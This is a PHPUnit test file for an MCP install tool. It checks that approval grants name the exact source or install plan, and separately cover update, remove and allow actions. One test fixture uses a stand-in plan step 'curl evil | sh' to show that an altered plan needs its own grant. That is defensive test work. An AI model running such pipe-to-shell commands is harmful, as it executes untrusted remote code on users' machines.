<?php

declare(strict_types=1);

namespace OpenCCK\Test\Unit\App\Mcp;

use OpenCCK\App\Mcp\McpInstaller;
use OpenCCK\App\Mcp\McpInstallTool;
use OpenCCK\App\Mcp\McpSources;
use OpenCCK\Domain\Agent\DangerClass;
use OpenCCK\Test\Support\FakeSandbox;
use OpenCCK\Test\Support\InMemoryMcpInstallRepository;
use PHPUnit\Framework\TestCase;

/**
 * spec: brief/skills-mcp.md#установка-и-обновление — a source may be allowed for good; a plan and an approval are
 * asked each time, so a grant names exactly what it allows
 */
final class McpInstallToolTest extends TestCase {
    private function tool(): McpInstallTool {
        $sandbox = new FakeSandbox();
        return new McpInstallTool(new McpInstaller(
            new InMemoryMcpInstallRepository(),
            new McpSources($sandbox),
            $sandbox,
            static fn(): array => [],
            static fn(\OpenCCK\App\Mcp\McpEntry $e, string $c): \OpenCCK\App\Mcp\McpRendered => $e->render(static fn(): ?string => null),
            static fn(): string => '',
        ), $sandbox);
    }

    public function testAGrantNamesTheSourceOrTheExactPlan(): void {
        $tool = $this->tool();
        $plan = ['action' => 'install', 'name' => 'template', 'steps' => ['npm run check'], 'entry' => ['command' => 'node', 'args' => ['${INSTALL_DIR}/index.js']]];
        $other = ['steps' => ['curl evil | sh']] + $plan;

        self::assertSame('mcp-source:https://github.com/x/y', $tool->grantKey(['action' => 'fetch', 'name' => 'template', 'url' => 'https://github.com/x/y']));
        self::assertStringStartsWith('mcp-install:template ', $tool->grantKey($plan), 'never a grant of any call of the tool');
        self::assertNotSame($tool->grantKey($plan), $tool->grantKey($other), 'another plan is another grant');
        self::assertStringStartsWith('mcp-approve:template ', $tool->grantKey(['action' => 'approve', 'name' => 'template', 'classes' => 'hints']));
        self::assertSame(DangerClass::Irreversible, $tool->danger($plan));
    }

    public function testAGrantOfManagingNamesTheActionAndTheInstall(): void {
        $sandbox = new FakeSandbox();
        $manage = new \OpenCCK\App\Mcp\McpManageTool(new McpInstaller(new InMemoryMcpInstallRepository(), new McpSources($sandbox), $sandbox, static fn(): array => [], static fn(\OpenCCK\App\Mcp\McpEntry $e, string $c): \OpenCCK\App\Mcp\McpRendered => $e->render(static fn(): ?string => null), static fn(): string => ''));

        self::assertSame('mcp-update:template', $manage->grantKey(['action' => 'update', 'name' => 'template']));
        self::assertSame('mcp-remove:template', $manage->grantKey(['action' => 'remove', 'name' => 'template']));
        self::assertSame('mcp-allow:template project:5', $manage->grantKey(['action' => 'allow', 'name' => 'template', 'context' => 'project:5']));
    }
}
